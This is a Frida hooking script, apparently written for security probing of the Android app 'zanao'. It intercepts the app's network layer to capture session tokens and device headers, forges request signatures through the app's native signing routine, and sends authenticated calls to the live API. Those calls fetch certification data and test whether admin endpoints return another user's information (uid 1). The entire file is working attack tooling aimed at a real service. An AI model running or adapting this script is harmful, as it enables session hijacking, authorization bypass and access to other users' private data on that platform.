// probe12.js — 取真实 school_id 后看 certinfo 结构；复核 thread/admin/* 鉴权
var TOKEN = null, ALIAS = null, DEVICE = null;
function sign(f) {
    var T = Java.use('java.util.TreeMap'), m = T.$new();
    for (var k in f) m.put(String(k), String(f[k]));
    return Java.use('com.comingx.zanao.utils.JniUtils').makeSign(m);
}
function bytesOf(s) {
    var S = Java.use('java.lang.String'), bs = S.$new(s).getBytes('UTF-8'), a = [];
    for (var i = 0; i < bs.length; i++) a.push(bs[i]);
    return Java.array('byte', a);
}
function api(method, path, data) {
    var S = Java.use('java.lang.String'), HUC = Java.use('java.net.HttpURLConnection');
    var url = 'http://api.app.zanao.com' + path, q = [];
    for (var k in data) q.push(encodeURIComponent(k) + '=' + encodeURIComponent(data[k]));
    if (method === 'GET' && q.length) url += '?' + q.join('&');
    var c = Java.cast(Java.use('java.net.URL').$new(url).openConnection(), HUC);
    c.setRequestMethod(method); c.setConnectTimeout(15000); c.setReadTimeout(25000); c.setDoInput(true);
    var nd = '', td = String(Math.floor(Date.now() / 1000));
    for (var i = 0; i < 20; i++) nd += Math.floor(Math.random() * 10);
    var si = { timestamp__: td, randnum__: nd };
    for (var kk in data) si[kk] = data[kk];
    var h = {
        'X-Sc-Alias': ALIAS, 'X-Sc-Token': TOKEN, 'X-Sc-Client': 'app',
        'X-Sc-Device': DEVICE, 'X-Sc-Platform': 'Android', 'X-Sc-Hb-V': '210',
        'X-Sc-Nt-V': '310', 'X-Sc-Version': '3.1.0', 'X-Sc-Nd': nd, 'X-Sc-Td': td,
        'X-Sc-Ah': sign(si), 'X-Requested-With': 'XMLHttpRequest', 'User-Agent': 'okhttp/4.9.3'
    };
    if (method === 'POST') { h['Content-Type'] = 'application/json; charset=utf-8'; c.setDoOutput(true); }
    for (var k2 in h) c.setRequestProperty(k2, String(h[k2]));
    if (method === 'POST') { var os = c.getOutputStream(); os.write(bytesOf(JSON.stringify(data))); os.flush(); os.close(); }
    var code = c.getResponseCode();
    var is = (code >= 400) ? c.getErrorStream() : c.getInputStream(), txt = '';
    if (is !== null) {
        var BAOS = Java.use('java.io.ByteArrayOutputStream'), buf = Java.array('byte', new Array(8192).fill(0)), b = BAOS.$new();
        while (true) { var n = is.read(buf); if (n <= 0) break; b.write(buf, 0, n); }
        is.close(); txt = String(S.$new(b.toByteArray(), 'UTF-8'));
    }
    var j = null; try { j = JSON.parse(txt); } catch (e) { }
    return { code: code, json: j, raw: j ? null : txt.substring(0, 300) };
}
function deep(o, key, d) {
    d = d || 0;
    if (d > 6 || !o || typeof o !== 'object') return null;
    if (typeof o[key] !== 'undefined') return o[key];
    for (var k in o) { var r = deep(o[k], key, d + 1); if (r !== null) return r; }
    return null;
}
function run() {
    var out = [];
    var cu = api('POST', '/app/checkuser', {});
    var schoolId = deep(cu.json, 'school_id'), cid = deep(cu.json, 'cid');
    out.push({ tag: 'checkuser', errno: cu.json && cu.json.errno, school_id: schoolId, cid: cid,
               json: JSON.stringify(cu.json).substring(0, 500) });
    if (schoolId) {
        var ci = api('GET', '/user/certinfo', { school_id: String(schoolId) });
        out.push({ tag: 'certinfo', school_id: schoolId, errno: ci.json && ci.json.errno,
                   errmsg: ci.json && ci.json.errmsg, json: JSON.stringify(ci.json).substring(0, 800) });
    }
    var t1 = api('POST', '/thread/admin/userinfo', { uid: 1 });
    out.push({ tag: 'thread/admin/userinfo', errno: t1.json && t1.json.errno, errmsg: t1.json && t1.json.errmsg });
    var t2 = api('POST', '/thread/admin/userthread', { uid: 1 });
    out.push({ tag: 'thread/admin/userthread', errno: t2.json && t2.json.errno, errmsg: t2.json && t2.json.errmsg });
    send({ t: 'results', list: out });
}
(function w(t) {
    if (typeof Java !== 'undefined') {
        Java.perform(function () {
            var N = Java.use('com.comingx.zanao.JSIs.NetworkJSI');
            ['request', 'easyRequest'].forEach(function (m) {
                if (!N[m]) return;
                N[m].overloads.forEach(function (ov) {
                    if (ov.argumentTypes.length !== 1 || ov.argumentTypes[0].className !== 'java.lang.String') return;
                    ov.implementation = function (s) {
                        try {
                            if (!TOKEN && s && s.indexOf('X-Sc-Token') >= 0) {
                                var p = JSON.parse(s), v = p.parameters[0].value;
                                TOKEN = v.header['X-Sc-Token']; ALIAS = v.header['X-Sc-Alias']; DEVICE = v.header['X-Sc-Device'];
                                setTimeout(function () { try { run(); } catch (e) { send({ t: 'run-err', m: '' + e }); } }, 2500);
                            }
                        } catch (e) { }
                        return ov.call(this, s);
                    };
                });
            });
        });
        return;
    }
    if (t <= 0) return;
    setTimeout(function () { w(t - 1); }, 200);
})(200);
